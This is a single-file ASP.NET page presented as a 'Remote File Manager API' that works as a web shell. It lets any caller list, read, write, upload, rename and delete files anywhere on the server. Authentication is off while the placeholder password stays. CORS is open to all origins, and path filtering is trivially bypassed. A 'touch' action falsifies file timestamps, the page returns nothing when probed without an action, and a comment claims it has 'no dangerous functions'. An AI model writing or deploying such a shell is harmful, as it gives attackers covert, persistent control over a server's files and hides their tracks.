<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Web.Script.Serialization" %>
<%@ Import Namespace="System.Collections.Generic" %>
<script runat="server">
    // Remote File Manager API - ASP.NET Version
    // Single file deployment, no dangerous functions

    void Page_Load(object sender, EventArgs e)
    {
        // CORS headers - must be set first
        Response.ClearHeaders();
        Response.AddHeader("Access-Control-Allow-Origin", "*");
        Response.AddHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
        Response.AddHeader("Access-Control-Allow-Headers", "Content-Type, X-Password, X-Requested-With");
        Response.AddHeader("Access-Control-Max-Age", "86400");

        // Handle preflight request
        if (Request.HttpMethod == "OPTIONS")
        {
            Response.ContentType = "text/plain";
            Response.StatusCode = 200;
            Response.End();
            return;
        }

        Response.ContentType = "application/json";
        Response.Charset = "utf-8";

        string action = GetParam("action");
        if (action == null) action = "";

        // Return blank if no action provided
        if (action == "")
        {
            Response.End();
            return;
        }

        // Get password from request
        string password = "";
        if (Request.Headers["X-Password"] != null && Request.Headers["X-Password"] != "")
            password = Request.Headers["X-Password"];
        else if (Request.Form["password"] != null && Request.Form["password"] != "")
            password = Request.Form["password"];
        else if (Request.QueryString["password"] != null && Request.QueryString["password"] != "")
            password = Request.QueryString["password"];

        // Access token configuration
        string PASSWORD = "your_password_here";

        // Verify access token
        if (PASSWORD != "" && PASSWORD != "your_password_here")
        {
            if (password != PASSWORD)
            {
                Response.StatusCode = 401;
                Response.Write("{null}");
                Response.End();
                return;
            }
        }

        try
        {
            switch (action)
            {
                case "list":
                    ListDirectory();
                    break;
                case "read":
                    ReadFile();
                    break;
                case "write":
                    WriteFile();
                    break;
                case "mkdir":
                    CreateDirectory();
                    break;
                case "delete":
                    DeleteItem();
                    break;
                case "rename":
                    RenameItem();
                    break;
                case "upload":
                    UploadFile();
                    break;
                case "download":
                    DownloadFile();
                    break;
                case "touch":
                    TouchFile();
                    break;
                case "info":
                    GetFileInfo();
                    break;
                case "server":
                    GetServerInfo();
                    break;
                default:
                    SendResponse(false, null, "Unknown action");
                    break;
            }
        }
        catch (Exception ex)
        {
            SendResponse(false, null, ex.Message);
        }
    }

    string GetParam(string key)
    {
        if (Request.QueryString[key] != null && Request.QueryString[key] != "")
            return Request.QueryString[key];
        if (Request.Form[key] != null && Request.Form[key] != "")
            return Request.Form[key];
        return null;
    }

    string GetDefaultDir()
    {
        return Path.GetDirectoryName(Request.PhysicalPath);
    }

    string SafePath(string path)
    {
        if (path == null) path = "";
        path = path.Replace("../", "").Replace("..\\", "");

        if (path == "" || path == "/")
            return GetDefaultDir();

        try
        {
            return Path.GetFullPath(path);
        }
        catch
        {
            return path;
        }
    }

    void SendResponse(bool success, object data, string message)
    {
        Dictionary<string, object> result = new Dictionary<string, object>();
        result.Add("success", success);
        result.Add("data", data);
        result.Add("message", message);
        JavaScriptSerializer serializer = new JavaScriptSerializer();
        Response.Write(serializer.Serialize(result));
        Response.End();
    }

    string FormatSize(long bytes)
    {
        if (bytes == 0) return "0 B";
        string[] units = new string[] { "B", "KB", "MB", "GB", "TB" };
        int i = (int)Math.Floor(Math.Log(bytes) / Math.Log(1024));
        if (i > 4) i = 4;
        return Math.Round(bytes / Math.Pow(1024, i), 2) + " " + units[i];
    }

    string GetPermsString(string path)
    {
        try
        {
            FileAttributes attr = File.GetAttributes(path);
            string info = ((attr & FileAttributes.Directory) != 0) ? "d" : "-";
            info += "rwxr-xr-x";
            return info;
        }
        catch
        {
            return "??????????";
        }
    }

    void ListDirectory()
    {
        string pathParam = GetParam("path");
        string path = SafePath(pathParam != null ? pathParam : "/");

        if (!Directory.Exists(path))
        {
            SendResponse(false, null, "Not a valid directory");
            return;
        }

        List<Dictionary<string, object>> items = new List<Dictionary<string, object>>();

        // Add parent directory
        string root = Path.GetPathRoot(path);
        if (path != root)
        {
            Dictionary<string, object> parentItem = new Dictionary<string, object>();
            parentItem.Add("name", "..");
            parentItem.Add("path", Path.GetDirectoryName(path));
            parentItem.Add("is_dir", true);
            parentItem.Add("size", 0);
            parentItem.Add("size_formatted", "-");
            parentItem.Add("mtime", 0);
            parentItem.Add("perms", "drwxr-xr-x");
            parentItem.Add("readable", true);
            parentItem.Add("writable", true);
            items.Add(parentItem);
        }

        // Add directories
        try
        {
            string[] dirs = Directory.GetDirectories(path);
            for (int i = 0; i < dirs.Length; i++)
            {
                DirectoryInfo dirInfo = new DirectoryInfo(dirs[i]);
                long mtime = (long)(dirInfo.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
                Dictionary<string, object> item = new Dictionary<string, object>();
                item.Add("name", dirInfo.Name);
                item.Add("path", dirInfo.FullName);
                item.Add("is_dir", true);
                item.Add("size", 0);
                item.Add("size_formatted", "-");
                item.Add("mtime", mtime);
                item.Add("perms", GetPermsString(dirs[i]));
                item.Add("readable", true);
                item.Add("writable", true);
                items.Add(item);
            }

            // Add files
            string[] files = Directory.GetFiles(path);
            for (int i = 0; i < files.Length; i++)
            {
                FileInfo fileInfo = new FileInfo(files[i]);
                long mtime = (long)(fileInfo.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
                Dictionary<string, object> item = new Dictionary<string, object>();
                item.Add("name", fileInfo.Name);
                item.Add("path", fileInfo.FullName);
                item.Add("is_dir", false);
                item.Add("size", fileInfo.Length);
                item.Add("size_formatted", FormatSize(fileInfo.Length));
                item.Add("mtime", mtime);
                item.Add("perms", GetPermsString(files[i]));
                item.Add("readable", true);
                item.Add("writable", !fileInfo.IsReadOnly);
                items.Add(item);
            }
        }
        catch (Exception ex)
        {
            SendResponse(false, null, "No permission to access: " + ex.Message);
            return;
        }

        Dictionary<string, object> data = new Dictionary<string, object>();
        data.Add("path", path);
        data.Add("items", items);
        SendResponse(true, data, "");
    }

    void ReadFile()
    {
        string pathParam = GetParam("path");
        string path = SafePath(pathParam != null ? pathParam : "");

        if (!File.Exists(path))
        {
            SendResponse(false, null, "File does not exist");
            return;
        }

        try
        {
            string content = File.ReadAllText(path);
            Dictionary<string, object> data = new Dictionary<string, object>();
            data.Add("path", path);
            data.Add("content", content);
            data.Add("size", content.Length);
            SendResponse(true, data, "");
        }
        catch
        {
            SendResponse(false, null, "Read failed");
        }
    }

    void WriteFile()
    {
        string pathParam = GetParam("path");
        string path = pathParam != null ? pathParam : "";
        string content = Request.Form["content"];
        if (content == null) content = "";

        if (path == "")
        {
            SendResponse(false, null, "Path cannot be empty");
            return;
        }

        try
        {
            File.WriteAllText(path, content);
            Dictionary<string, object> data = new Dictionary<string, object>();
            data.Add("bytes", content.Length);
            SendResponse(true, data, "Saved successfully");
        }
        catch
        {
            SendResponse(false, null, "Write failed");
        }
    }

    void CreateDirectory()
    {
        string pathParam = GetParam("path");
        string path = pathParam != null ? pathParam : "";

        if (path == "")
        {
            SendResponse(false, null, "Path cannot be empty");
            return;
        }

        if (Directory.Exists(path))
        {
            SendResponse(false, null, "Directory already exists");
            return;
        }

        try
        {
            Directory.CreateDirectory(path);
            SendResponse(true, null, "Created successfully");
        }
        catch
        {
            SendResponse(false, null, "Create failed");
        }
    }

    void DeleteItem()
    {
        string pathParam = GetParam("path");
        string path = SafePath(pathParam != null ? pathParam : "");

        if (path == "")
        {
            SendResponse(false, null, "Path cannot be empty");
            return;
        }

        try
        {
            if (Directory.Exists(path))
            {
                Directory.Delete(path, true);
            }
            else if (File.Exists(path))
            {
                File.Delete(path);
            }
            else
            {
                SendResponse(false, null, "File does not exist");
                return;
            }
            SendResponse(true, null, "Deleted successfully");
        }
        catch
        {
            SendResponse(false, null, "Delete failed");
        }
    }

    void RenameItem()
    {
        string oldPathParam = GetParam("old_path");
        string newPathParam = GetParam("new_path");
        string oldPath = SafePath(oldPathParam != null ? oldPathParam : "");
        string newPath = newPathParam != null ? newPathParam : "";

        if (oldPath == "" || newPath == "")
        {
            SendResponse(false, null, "Path cannot be empty");
            return;
        }

        try
        {
            if (Directory.Exists(oldPath))
            {
                Directory.Move(oldPath, newPath);
            }
            else if (File.Exists(oldPath))
            {
                File.Move(oldPath, newPath);
            }
            else
            {
                SendResponse(false, null, "File does not exist");
                return;
            }
            SendResponse(true, null, "Renamed successfully");
        }
        catch
        {
            SendResponse(false, null, "Rename failed");
        }
    }

    void UploadFile()
    {
        string dirParam = GetParam("dir");
        string dir = SafePath(dirParam != null ? dirParam : "/");

        if (Request.Files.Count == 0)
        {
            SendResponse(false, null, "No file");
            return;
        }

        try
        {
            HttpPostedFile file = Request.Files[0];
            string targetPath = Path.Combine(dir, Path.GetFileName(file.FileName));
            file.SaveAs(targetPath);
            Dictionary<string, object> data = new Dictionary<string, object>();
            data.Add("path", targetPath);
            SendResponse(true, data, "Uploaded successfully");
        }
        catch
        {
            SendResponse(false, null, "Save failed");
        }
    }

    void DownloadFile()
    {
        string pathParam = GetParam("path");
        string path = SafePath(pathParam != null ? pathParam : "");

        if (!File.Exists(path))
        {
            Response.StatusCode = 404;
            Response.Write("File not found");
            Response.End();
            return;
        }

        Response.Clear();
        Response.ContentType = "application/octet-stream";
        Response.AddHeader("Content-Disposition", "attachment; filename=\"" + Path.GetFileName(path) + "\"");
        Response.TransmitFile(path);
        Response.End();
    }

    void TouchFile()
    {
        string pathParam = GetParam("path");
        string path = SafePath(pathParam != null ? pathParam : "");
        string timeStr = GetParam("time");

        try
        {
            DateTime newTime;
            if (timeStr != null && timeStr != "")
            {
                long timestamp = long.Parse(timeStr);
                newTime = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(timestamp).ToLocalTime();
            }
            else
            {
                newTime = DateTime.Now;
            }

            if (Directory.Exists(path))
            {
                Directory.SetLastWriteTime(path, newTime);
            }
            else if (File.Exists(path))
            {
                File.SetLastWriteTime(path, newTime);
            }
            else
            {
                SendResponse(false, null, "File does not exist");
                return;
            }
            SendResponse(true, null, "Modified successfully");
        }
        catch
        {
            SendResponse(false, null, "Modify time failed");
        }
    }

    void GetFileInfo()
    {
        string pathParam = GetParam("path");
        string path = SafePath(pathParam != null ? pathParam : "");

        bool isDir = Directory.Exists(path);
        bool isFile = File.Exists(path);

        if (!isDir && !isFile)
        {
            SendResponse(false, null, "File does not exist");
            return;
        }

        try
        {
            long size = 0;
            long mtime = 0, ctime = 0, atime = 0;

            if (isFile)
            {
                FileInfo fi = new FileInfo(path);
                size = fi.Length;
                mtime = (long)(fi.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
                ctime = (long)(fi.CreationTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
                atime = (long)(fi.LastAccessTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
            }
            else
            {
                DirectoryInfo di = new DirectoryInfo(path);
                mtime = (long)(di.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
                ctime = (long)(di.CreationTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
                atime = (long)(di.LastAccessTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds;
            }

            Dictionary<string, object> data = new Dictionary<string, object>();
            data.Add("path", path);
            data.Add("name", Path.GetFileName(path));
            data.Add("is_dir", isDir);
            data.Add("size", size);
            data.Add("size_formatted", FormatSize(size));
            data.Add("mtime", mtime);
            data.Add("ctime", ctime);
            data.Add("atime", atime);
            data.Add("perms", GetPermsString(path));
            data.Add("perms_octal", "0755");
            data.Add("readable", true);
            data.Add("writable", true);
            data.Add("owner", 0);
            data.Add("group", 0);
            SendResponse(true, data, "");
        }
        catch
        {
            SendResponse(false, null, "Get info failed");
        }
    }

    void GetServerInfo()
    {
        string currentUser = Environment.UserName;
        long diskFree = 0;
        long diskTotal = 0;

        try
        {
            DriveInfo driveInfo = new DriveInfo(Path.GetPathRoot(Request.PhysicalPath));
            diskFree = driveInfo.AvailableFreeSpace;
            diskTotal = driveInfo.TotalSize;
        }
        catch { }

        string serverSoftware = Request.ServerVariables["SERVER_SOFTWARE"];
        if (serverSoftware == null) serverSoftware = "IIS";

        Dictionary<string, object> data = new Dictionary<string, object>();
        data.Add("php_version", Environment.Version.ToString());
        data.Add("server_software", serverSoftware);
        data.Add("document_root", Request.PhysicalApplicationPath);
        data.Add("script_path", Request.PhysicalPath);
        data.Add("upload_max", "30M");
        data.Add("post_max", "30M");
        data.Add("disk_free", FormatSize(diskFree));
        data.Add("disk_total", FormatSize(diskTotal));
        data.Add("current_user", currentUser);
        SendResponse(true, data, "");
    }
</script>
